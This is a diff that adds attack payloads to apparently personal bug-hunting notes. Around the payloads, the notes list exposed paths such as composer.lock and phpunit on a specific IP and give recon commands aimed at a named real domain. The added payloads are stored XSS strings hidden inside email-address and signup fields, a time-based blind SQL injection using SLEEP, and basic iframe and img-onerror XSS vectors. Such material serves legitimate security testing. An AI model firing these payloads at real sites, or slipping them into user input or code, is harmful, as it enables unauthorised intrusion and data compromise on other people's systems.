@@ -57,6 +57,21 @@ https://20.86.155.86/composer.lock
 https://20.86.155.86/vendor/composer/installed.json
 https://20.86.155.86/vendor/phpunit/phpunit/phpunit
 
+Stored XSS in Email Fields:
+--------------------------
++test<h1/onmouseover​=alert(origin)>test@gmail.com
+lipsec+<h1/onmouseover​=alert(origin)>lipseclimited@gmail.com
+
+Persistent XSS in the Signup Process:
+<img src=x onerror​=alert(origin)>
+
+SQLi Blind Time Base:
+xss' AND (SELECT 8091 FROM (SELECT(SLEEP(5)))sRDf) AND 'wRgw'='wRgw
+
+Very simple XSS Payload:
+<iframe src="javascript​:prompt`${origin}`" xss="">
+<img src=x onerror="alert(origin)">
+
 ---------------------------------------------------
 grep -vE '^$' algolia.com.txt | sed 's/^\*\.//' | tee subs.txt
 cat algolia.com.txt | httpx-toolkit --random-agent --status-code --title -server -td -cl
